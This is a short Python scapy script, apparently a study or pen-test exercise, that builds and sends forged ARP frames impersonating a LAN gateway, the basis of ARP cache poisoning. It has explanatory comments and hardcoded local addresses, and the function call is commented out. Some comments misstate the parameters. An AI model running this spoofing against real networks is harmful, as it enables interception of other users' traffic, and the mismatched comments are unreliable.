from scapy.all import *



def pen_test_poison(victim_ip: str, victim_mac: str, default_gateway_ip: str):
    '''
    the sendp function works on layer 2 (Data Link) so in the subnet locally with ethernet
    so its in the MAC addressing and local IP communication area
    Ethernet frames contain MAC addresses (src and dst) while packets contain IP addresses (src and dst)
    this function builds an ethernet frame and then the packet content of the ethernet frame the "/" defines encapsulation
    '''
    sendp(Ether(dst=victim_mac) / # Ether() builds an ethernet frame with the destination of the target device (MAC address is like a fixed "name" of a device on the LAN)
          ARP(op="who-has", # ARP() creates an ARP packet (ARP is the protocol to match local IPs and MAC addresses) the op (operation) who-has means the ARP is a question not reply 
            psrc=default_gateway_ip, # protocol source address we lie and pretend this comes from the gateway (router in our case)
            pdst=victim_ip), # the pdst (Protocol destination address) is the address we are focusing on with ARP in this case asking who it belongs to
            inter=0.1, count=20) # interval of 0.2 means send one of these packets every 0.2 seconds and loop 1 means forever


default_gateway_ip = "192.168.1.254"
gateway_mac = "F8:22:29:26:79:70"
victim_mac = "18:3D:A2:F7:C7:EA"
victim_ip = "192.168.1.127"
attacker_ip = "192.168.1.122"
attacker_mac = "3C:55:76:DE:12:EF"


#pen_test_poison(victim_ip, victim_mac, default_gateway_ip)
print(conf.iface)